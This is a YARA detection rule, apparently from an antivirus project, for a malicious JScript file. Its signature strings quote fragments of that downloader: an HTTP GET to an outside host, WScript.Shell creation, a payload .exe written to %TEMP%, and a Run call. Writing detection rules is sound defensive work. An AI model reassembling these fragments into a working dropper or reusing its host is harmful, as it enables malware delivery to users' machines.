rule sig_20160401_31b2b5ff9c90d03ea90e34c0ad355b24 {
  meta:
    description = "datamaliciousorder - file 20160401_31b2b5ff9c90d03ea90e34c0ad355b24.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f4d3b7571dc1f31121939cdd203237a2cc01561ea277e874f0f6e248221df5b1"

  strings:
    $s1  = "JafIn[FclIys](\"G\" + \"ET\", \"http://echo-gs.com/i2osa\", false);" fullword ascii
    $s2  = "var VwdZhs = function BbQs() {return WScript[AyyNt](\"WScript\"+\".Shell\");}(), NxUjl = 11;" fullword ascii
    $s3  = "function DmjLx(JsVe, MzxGl){GrqWzv = GrqWzv * 1; return JsVe - MzxGl;};" fullword ascii
    $s4  = "if (JafIn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function HxmZi() {return VwdZhs[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2Ekh3BYhgWUPP8f.ex\" + \"e\";};" fullword ascii
    $s6  = "function XroZtn(){return BcCo + \"\";};" fullword ascii
    $s7  = "function CsLi() {return ((MckSl == true) && (MckSl == CteDze)) ? 1 : GrqWzv;};" fullword ascii
    $s8  = "function RmXcu(){return AyyNt;};" fullword ascii
    $s9  = "function VlUng(){return 23;};" fullword ascii
    $s10 = "var CteDze = false;" fullword ascii
    $s11 = "}while (VvOn);" fullword ascii
    $s12 = "var KyJq = new this[\"Date\"]();" fullword ascii
    $s13 = "CteDze = true; " fullword ascii
    $s14 = "var MckSl = false;" fullword ascii
    $s15 = "return DmjLx(UboJg, NraNzw);" fullword ascii
    $s16 = "function PnzFvd()" fullword ascii
    $s17 = "var SdsJjn = false;" fullword ascii
    $s18 = "MckSl = true; " fullword ascii
    $s19 = "function LpDs(WokFf) {var ZdEer = (1, 2, 3, 4, 5, WokFf); return ZdEer;};" fullword ascii
    $s20 = "function OrgBo(SdSkk){VwdZhs[\"R\"+\"un\"](SdSkk, GrqWzv, GrqWzv);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}